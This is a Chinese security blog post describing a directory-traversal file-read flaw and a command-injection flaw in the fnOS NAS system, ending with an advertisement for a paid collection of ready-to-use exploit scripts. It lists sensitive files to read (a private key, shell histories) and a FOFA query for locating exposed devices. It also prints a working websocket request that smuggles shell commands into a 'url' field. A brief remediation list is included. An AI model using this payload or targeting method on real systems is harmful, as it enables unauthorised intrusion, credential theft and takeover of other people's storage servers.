#  1day | 飞牛系统（fnOS）app-center-static 目录遍历导致任意文件读取漏洞+命令执行漏洞  
 实战安全研究   2026-02-01 00:57  
  
**免责声明**  
<table><tbody><tr style="-webkit-tap-highlight-color: transparent;outline: 0px;visibility: visible;"><td valign="top" style="-webkit-tap-highlight-color: transparent;outline: 0px;word-break: break-all;hyphens: auto;visibility: visible;"><span style="color: rgb(255, 0, 0);letter-spacing: 0.544px;-webkit-tap-highlight-color: rgba(0, 0, 0, 0);outline: 0px;visibility: visible;font-size: 14px;"><span leaf="">本文仅用于技术学习和安全研究，请勿使用本文所提供的内容及相关技术从事非法活动，由于传播和利用此文所提供的内容或工具而造成任何直接或间接的损失后果，均由使用者本人承担，所产生一切不良后果与文章作者及本账号无关。如内容有争议或侵权，请私信我们！我们会立即删除并致歉。谢谢！</span></span></td></tr></tbody></table>  
1  
  
**漏洞描述**  
  
  
  
飞牛系统（fnOS）fnOS出现严重0day漏洞，app-center-static 接口存在目录遍历导致的列目录和文件读取漏洞（包括系统配置文件，用户存储文件），未授权的攻击者可利用该漏洞读取服务器系统上任意文件如私钥(/usr/trim/etc/rsa_private_key.pem)、历史记录(/root/.bash_history)等敏感信息(/root/.psql_history)，进而可能导致服务器失陷。  
  
2  
  
**影响版本**  
  
  
  
1.1.15版本以下  
  
3  
  
**fofa语法**  
  
  
  
fofa语法  
```
icon_hash="470295793" || app="飞牛-私有云fnOS"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF3Sgj5UsJGY5t38IyPSHGx5yH8VFDhwaUWmQUgduZwq8Wbjqc3k8icUs9Jn92KcrCDQibOM4beYdunQ/640?wx_fmt=png&from=appmsg "")  
  
  
4  
  
**漏洞复现**  
  
  
  
读取文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF3Sgj5UsJGY5t38IyPSHGx5BtHSq7Yu4icAwv8KDOHGViabIlbNC0Uc8D2O30icpNQ7iaWp7OzL2LXdNQ/640?wx_fmt=png&from=appmsg "")  
  
命令执行  
```
http://IP:5666/websocket?type=main

cA8dKVgUFNf/5QdKdIa7nEhaup6ObIo6D18J0am+KBQ=
{"reqid":"697da669697da3bc000000090f31","req":"appcgi.dockermgr.systemMirrorAdd","url":"https://test.example.com; /usr/bin/touch /tmp/hacked20260131 ; /usr/bin/echo ","name":"2"}
```  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJIvelPj7bdEKPVhKQxEa0xbIGWiayehN4u7GoNerxl6LoOGM8JN0cWG3YVfBySw4ib4Dl0prhic28iaOA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=2 "")  
  
  
5  
  
**检测POC**  
  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF3Sgj5UsJGY5t38IyPSHGx5ZR27RTH0wyUdUvCPszGPsbrZrFh1RwvzFNSuumxXsmU0RUDxlndwxQ/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF3Sgj5UsJGY5t38IyPSHGx58QYzm85DZWjRnW3npQs6oLXE4CuThRbe9MMAz92zeRYjq4zibVslOgw/640?wx_fmt=png&from=appmsg "")  
  
  
6  
  
**漏洞修复**  
  
  
1、建议联系厂商打补丁或升级版本。  
  
2、增加Web应用防火墙防护。  
  
3、关闭互联网暴露面或接口设置访问权限。  
  
7  
  
**内部圈子**  
  
  
**现在已更新POC数量 1800+（中危以上）**  
  
  
🔥 **1day/Nday 漏洞实战圈上线**  
 🔥  
  
还在到处找公开漏洞 POC？  
  
这里专注整合全网1day/Nday漏洞POC和复现，一站式解决你的痛点！  
  
🔍   
圈子福利  
  
✅ 整合全网 1day/Nday 漏洞POC，附带复现步骤，新手也能快速上手  
  
✅ 每周更新 10-15 个POC测试脚本，经过实测验证，到手就能用  
  
✅ 完美适配 Nuclei/Afrog 扫描工具，脚本无需额外修改，即拿即用  
  
✅ 重磅福利：免登录免费 FOFA 查询，无需账号也能高效资产测绘  
  
✅ 专属权益：提供指纹识别库，指纹库持续更新  
  
💡   
适合对象  
  
渗透测试🔹攻防演练🔹安全运维🔹企业自查  
🔹SRC漏洞挖掘  
  
⚠️   
重要提醒  
  
仅限授权范围内的合法安全测试，严禁用于未授权攻击行为！  
  
本服务为虚拟资源服务，一经购买概不退款，请按需谨慎购买！  
  
现在加入圈子价格是59.9元（  
交个朋友啦  
），后面将调整涨价啦。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zBdps5HcBF0CYlRwc6wiaMBhkXkUHJibwOgIbGDudcEeicud8QzicCAwx8ODLuWiciaYc0K6Z5ryKiaBrXC6ib8YUvUeGg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
  
